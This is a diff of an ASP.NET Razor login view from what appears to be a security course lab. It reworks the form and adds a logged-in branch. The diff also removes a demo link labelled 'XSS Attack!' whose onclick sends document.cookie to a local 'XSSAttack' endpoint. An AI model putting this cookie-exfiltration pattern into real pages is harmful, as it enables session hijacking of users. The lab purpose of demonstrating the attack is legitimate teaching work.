@@ -4,47 +4,61 @@
     ViewBag.Title = "Login";
 }
 
-<h2>Login</h2>
+<h2>Lab2 - Login</h2>
 
 <div class="row">
-    <div class="col-lg-6 col-lg-offset-0">
-        @using (Html.BeginForm("Login", "Lab2", FormMethod.Post, new { @class = "well" }))
+    <div class="col-lg-6 col-lg-offset-0 well">
+        @if (Session["IsLoggedIn"] == null)
         {
-            @Html.AntiForgeryToken()
-            <input type="hidden" value="@ViewBag.token" name="token" />
-            <div>
-                @Html.LabelFor(m => m.Username)
-            </div>
-            <div>
-                @Html.TextBoxFor(m => m.Username, new { @class = "form-control" })
-            </div>
-            <div>
-                @Html.ValidationMessageFor(m => m.Username, "", new { @class = "error-message" })
-            </div>
+            using (Html.BeginForm("Login", "Lab2", FormMethod.Post))
+            {
+                @Html.AntiForgeryToken()
+                @Html.HiddenFor(m => m.token)
+                //<input type="hidden" value="@ViewBag.Token" name="token" />
+                <div>
+                    @Html.LabelFor(m => m.Username)
+                </div>
+                <div>
+                    @Html.TextBoxFor(m => m.Username, new { @class = "form-control" })
+                </div>
+                <div>
+                    @Html.ValidationMessageFor(m => m.Username, "", new { @class = "error-message" })
+                </div>
 
-            <div>
-                @Html.LabelFor(m => m.Password)
-            </div>
-            <div>
-                @Html.PasswordFor(m => m.Password, new { @class = "form-control" })
-            </div>
-            <div>
-                @Html.ValidationMessageFor(m => m.Password, "", new { @class = "error-message" })
-            </div>
+                <div>
+                    @Html.LabelFor(m => m.Password)
+                </div>
+                <div>
+                    @Html.PasswordFor(m => m.Password, new { @class = "form-control" })
+                </div>
+                <div>
+                    @Html.ValidationMessageFor(m => m.Password, "", new { @class = "error-message" })
+                </div>
 
-            <div>
-                @Html.LabelFor(m => m.IsStayLoggedin)
-            </div>
-            <div>
-                @Html.CheckBoxFor(m => m.IsStayLoggedin, new { @class = "form-control" })
-            </div>
-            <div>
-                @Html.ValidationMessageFor(m => m.IsStayLoggedin, "", new { @class = "error-message" })
-            </div>
-
-            <input type="submit" value="Login" class="btn btn-primary" />
+                <div>
+                    @Html.LabelFor(m => m.IsStayLoggedin)
+                </div>
+                <div>
+                    @Html.CheckBoxFor(m => m.IsStayLoggedin, new { @class = "form-control" })
+                </div>
+                <div>
+                    @Html.ValidationMessageFor(m => m.IsStayLoggedin, "", new { @class = "error-message" })
+                </div>
+                <div>
+                    <br />
+                    <input type="submit" value="Log in" class="btn btn-primary" /> @ViewBag.Message
+                </div>
+            }
         }
-        <a href="#" onclick="window.location = 'http://localhost:49854/Lab2/XSSAttack?cookie=' + escape(document.cookie); return false;">XSS Attack!</a>
+        else
+        {
+            <div>
+                @ViewBag.Message
+            </div>
+        }
     </div>
+</div>
+<div>
+    <p>@Html.ActionLink("Go Back", "Index", "Home")</p>
 </div>
 
